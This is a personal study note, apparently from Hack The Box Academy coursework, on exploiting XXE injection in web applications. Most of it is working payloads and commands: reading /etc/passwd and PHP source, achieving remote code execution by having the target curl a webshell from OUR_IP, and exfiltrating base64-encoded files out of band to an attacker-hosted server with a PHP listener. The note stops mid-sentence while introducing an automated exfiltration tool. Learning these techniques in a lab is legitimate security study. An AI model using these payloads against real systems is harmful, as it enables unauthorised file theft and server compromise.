XML is a common markup language desinged for flexible transfer and storage of data and documents, however, when a user-controlled input is not properly sanitized of parsed, as a result XXE Injection would allow us to perform malicious action

Local File Disclosure with XXE:

First, we need to find a webpage that actually accepts XML user input, this can be verified in burp suite whenever we attempt to send data to webserver and intercept with burp, we also need to note for which element is being displayed to us, else we can't disclose files

After locating it, we can add a new entity inside to see if it indeed display what we typed in like in the following example (assuming email got displayed):
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

After confirming the vulnerability, then we can start exploiting by using SYSTEM keyword and include a local file:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Disclosing Source Code:

Our attempt to use the above method to display any source code will not be succeed, as the file contains XML special character and it is not in a proper xml format, with cases like these we would have to use php filter like in the following manner:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

RCE with XXE Injection:

To perform RCE with XXE Injection, we would require the presence of php expect module, if it is present, we can host a webserver containing a webshell, and have it executed and referenced in the following manner:
```
Avalon112@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Avalon112@htb[/htb]$ sudo python3 -m http.server 80
#Hosting WebServer
```
Modifying XML Code:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]> #Using $IFS to avoid space, use of |, ? and {} should also be avoided
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Using CDATA to perform exfiltration:

We can use CDATA to enclose filecontent, so that it would be considered raw data instead of being parsed, this method works without using the php filter:
```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
This alone would not work as XML does not allow joining external and internal entity, therefore, we need to write the following line:
`<!ENTITY joined "&begin;&file;&end;">`
In to an external file controlled by us, have our payload structured in this way:
```
Avalon112@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Avalon112@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Error based XXE:

If the normal page does not have anything we can use, we can attempt to trigger an error and perform error based XXE, but this method is not reliable for exfiltration as often error page have length limit, refer to https://academy.hackthebox.com/app/module/134/section/1206 for more detail

Out of band Exfiltration:

Even if we cannot perform normal exfiltration due to different reason, we can perform out of band exfiltration by using XXE Injection to have the webserver make request that contains the file content that we needed:

Below is an example, we first save the below snippet to our webserver namely xxe.dtd:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Here, we first use base64 encoding to encode the file passwd, then we use it as parameter and have the website make a request to a webserver we host

Next, we use the following script to automate the decoding:
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
We save the following as index.php and serve it with a server
```
Avalon112@htb[/htb]$ vi index.php # here we write the above PHP code
Avalon112@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

We can use a payload similar to below, remember to reference it from our server:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

If everything goes well, we should be able to see the file content

Automated OOB Exfiltration:

We can use XXEInjector to perform Automated OOB Exfiltration https://github.com/enjoiz/XXEinjector, after cloning it, we copy the HTTP request from burp and write it to a file, below is the description of how to use this tool a